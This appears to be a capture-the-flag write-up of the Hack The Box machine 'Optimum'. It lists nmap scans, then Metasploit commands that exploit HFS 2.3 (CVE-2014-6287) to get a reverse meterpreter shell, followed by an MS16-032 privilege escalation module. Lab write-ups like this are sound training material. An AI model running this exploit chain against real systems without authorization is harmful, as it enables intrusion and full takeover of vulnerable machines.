---
layout: post
title: HTB Machine - Optimum
subtitle: Writeup
cover-img: 
thumbnail-img: 
share-img: 
tags: [ HTB,Hack the Box,Network,Vulnerability Assessment,Injection,Outdated Software,Security Tools,OS Command Injection,Python]
---
Ping analisys: Windows box
Scans:
```zsh
sudo nmap -sS 10.10.10.8 -p- --open --min-rate 5000 -n -Pn -oG ./nmap/allports
sudo nmap -sCV 10.10.10.8 -p80 -oN ./nmap/targeted
whatweb http://10.10.10.8
http://10.10.10.8 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```

the server uses a HttpFileServer 2.3. Using searchsploit we can check for a CVE vulnerability for RCE the CVE-2014-6287. Perhaps metasploit has something for that CVE. 
```zsh
msfconsole

search httpfileserver
```
We have a hit so let us use, configure and run the exploit. 
```zsh
use exploit/windows/http/rejetto_hfs_exec
options
set rhosts 10.10.10.8
set lhost tun0
run
```
We have a meterpreter shell to the machine and now we can poke around to find the flag. 

Since we have a meterpreter session lets background the session and use the local exploit suggester to see if something interesting comes up. 
```zsh
bg
search local exploit suggester
use post/multi/recon/local_exploit_suggester 
options
set session 1
run
```

great! 2 options come up. Lets use the secondary logon handle privesc
```zsh
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc 
options
set session 1
set lhost tun0
set lport 4442
run
```

And we gained a root meterpreter session that we will use to drop into a shell and grab our root flag. 
